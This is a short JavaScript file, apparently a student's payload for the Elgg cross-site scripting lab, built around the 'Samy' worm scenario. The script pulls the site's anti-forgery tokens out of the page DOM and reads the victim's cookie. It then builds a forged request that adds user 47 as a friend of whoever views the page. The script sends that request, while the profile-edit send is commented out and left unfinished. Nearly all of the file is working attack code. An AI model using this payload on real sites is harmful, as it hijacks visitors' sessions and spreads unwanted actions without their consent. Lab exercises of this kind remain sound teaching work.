console.log("Hello I am the attacker!");
console.log(document.all[35].attributes[0].nodeValue);
console.log(document.all[33].attributes[0].nodeValue);

let __elgg_ts = String(document.all[35].attributes[0].nodeValue).substr(50, 10);
let __elgg_token = String(document.all[35].attributes[0].nodeValue).substr(74, 22);
let samy_id = 47;
let cookie = document.cookie;
let me = String(document.all[33].attributes[0].nodeValue).substr(40,);
console.log("samy_id = " + String(samy_id));
console.log("cookie = " + cookie);
console.log("__elgg_ts = " + __elgg_ts);
console.log("__elgg_token = " + __elgg_token);
console.log("me = " + me);

if (me != "samy") { 
	var Ajax=null;
	// Construct the header information for the HTTP request
	Ajax=new XMLHttpRequest();
	let http_url = "http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts="+__elgg_ts+"&__elgg_token="+__elgg_token;
	console.log(http_url);
	//Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
	Ajax.open("POST",http_url,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Keep-Alive","300");
	Ajax.setRequestHeader("Connection","keep-alive");
	Ajax.setRequestHeader("Cookie",cookie);
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	// Construct the content. The format of the content can be learned
	// from LiveHTTPHeaders.
	var content="name=..&description=...&guid="; // You need to fill in the details.
	// Send the HTTP POST request.
	//Ajax.send(content);
}
